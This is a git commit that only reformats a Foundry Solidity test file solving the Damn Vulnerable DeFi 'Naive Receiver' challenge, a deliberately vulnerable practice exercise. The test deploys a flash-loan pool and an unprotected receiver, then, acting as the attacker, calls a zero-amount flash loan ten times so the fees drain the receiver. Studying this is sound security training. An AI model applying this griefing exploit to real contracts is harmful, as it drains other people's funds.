3006bc953805690749a99f05bc95bd1f74e03099
blankf1sh <123241176+blankf1sh@users.noreply.github.com>
2023-01-24 18:18:48 +0000

    forge fmt

--- test/NaiveReceiver.t.sol
+++ test/NaiveReceiver.t.sol
@@ -7,66 +7,64 @@ import "dvd-v3/naive-receiver/NaiveReceiverLenderPool.sol";
 import "dvd-v3/naive-receiver/FlashLoanReceiver.sol";
 
 contract NaiveReceiver is Test {
-	uint256 internal constant ETHER_IN_POOL = 1_000e18;
-	uint256 internal constant ETHER_IN_RECIEVER = 10e18;
+    uint256 internal constant ETHER_IN_POOL = 1_000e18;
+    uint256 internal constant ETHER_IN_RECIEVER = 10e18;
 
-	address payable internal deployer;
-	address payable internal attacker;
-	address payable internal someUser;
+    address payable internal deployer;
+    address payable internal attacker;
+    address payable internal someUser;
 
-	NaiveReceiverLenderPool internal nrlp;
-	FlashLoanReceiver internal flr;
+    NaiveReceiverLenderPool internal nrlp;
+    FlashLoanReceiver internal flr;
 
-	function setUp() public {
-		console.log("setting the scene");
-		console.log("~~~~~~~~~~~~~~~~~");
-		Utilities utils = new Utilities();
-		address payable[] memory users = utils.createUsers(3);
-		deployer = users[0];
-		vm.label(deployer, "deployer");
-		vm.deal(deployer, ETHER_IN_POOL);
-		attacker = users[1];
-		vm.label(attacker, "attacker");
-		someUser = users[2];
-		vm.label(someUser, "someUser");
-		vm.deal(someUser, ETHER_IN_RECIEVER);
-		
-		console.log("our trusted dev has released the beast");
-		vm.startPrank(deployer);
-		nrlp = new NaiveReceiverLenderPool();
-		vm.label(address(nrlp), "Pool");
-		(bool sent, ) = payable(nrlp).call{value: ETHER_IN_POOL}("");
-		require(sent, "Failed to send Ether");
-		vm.stopPrank();
-		console.log("the beast lives at %s", address(nrlp));
-		console.log("we have transferred %s to the pool to be used for flashloans", address(nrlp).balance);
+    function setUp() public {
+        console.log("setting the scene");
+        console.log("~~~~~~~~~~~~~~~~~");
+        Utilities utils = new Utilities();
+        address payable[] memory users = utils.createUsers(3);
+        deployer = users[0];
+        vm.label(deployer, "deployer");
+        vm.deal(deployer, ETHER_IN_POOL);
+        attacker = users[1];
+        vm.label(attacker, "attacker");
+        someUser = users[2];
+        vm.label(someUser, "someUser");
+        vm.deal(someUser, ETHER_IN_RECIEVER);
 
+        console.log("our trusted dev has released the beast");
+        vm.startPrank(deployer);
+        nrlp = new NaiveReceiverLenderPool();
+        vm.label(address(nrlp), "Pool");
+        (bool sent,) = payable(nrlp).call{value: ETHER_IN_POOL}("");
+        require(sent, "Failed to send Ether");
+        vm.stopPrank();
+        console.log("the beast lives at %s", address(nrlp));
+        console.log("we have transferred %s to the pool to be used for flashloans", address(nrlp).balance);
 
-		vm.startPrank(someUser);
-		flr = new FlashLoanReceiver(address(nrlp));
-		vm.label(address(flr), "Receiver");
-		(bool sent1, ) = payable(flr).call{value: ETHER_IN_RECIEVER}("");
-		require(sent1, "Failed to send Ether");
-		vm.stopPrank();
-		console.log("you happen across a wild unprotected flashloan receiver... let's ruin their day");
-		
-	}
+        vm.startPrank(someUser);
+        flr = new FlashLoanReceiver(address(nrlp));
+        vm.label(address(flr), "Receiver");
+        (bool sent1,) = payable(flr).call{value: ETHER_IN_RECIEVER}("");
+        require(sent1, "Failed to send Ether");
+        vm.stopPrank();
+        console.log("you happen across a wild unprotected flashloan receiver... let's ruin their day");
+    }
 
-	function testExploit() public {
-		// flr does not check that flashloan is for more than 0
-		// call flashloan 10 times with 0 as entry and the receiver will be empty due to the fee
-		vm.startPrank(attacker);
-		address ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
-		vm.label(ETH, "ETH");
-		for(uint i=0; i<10; i++) {
-			nrlp.flashLoan(flr, ETH, 0, "");
-			console.log("Calling flashloan. Current funds in receiver: %s", address(flr).balance);
-		}
-		vm.stopPrank();
+    function testExploit() public {
+        // flr does not check that flashloan is for more than 0
+        // call flashloan 10 times with 0 as entry and the receiver will be empty due to the fee
+        vm.startPrank(attacker);
+        address ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+        vm.label(ETH, "ETH");
+        for (uint256 i = 0; i < 10; i++) {
+            nrlp.flashLoan(flr, ETH, 0, "");
+            console.log("Calling flashloan. Current funds in receiver: %s", address(flr).balance);
+        }
+        vm.stopPrank();
 
-		// validation
-		assertEq(0, address(flr).balance);
-		assertEq(ETHER_IN_POOL + ETHER_IN_RECIEVER, address(nrlp).balance);
-		console.log("Current funds in the beast: %s", address(nrlp).balance);
-	}
+        // validation
+        assertEq(0, address(flr).balance);
+        assertEq(ETHER_IN_POOL + ETHER_IN_RECIEVER, address(nrlp).balance);
+        console.log("Current funds in the beast: %s", address(nrlp).balance);
+    }
 }
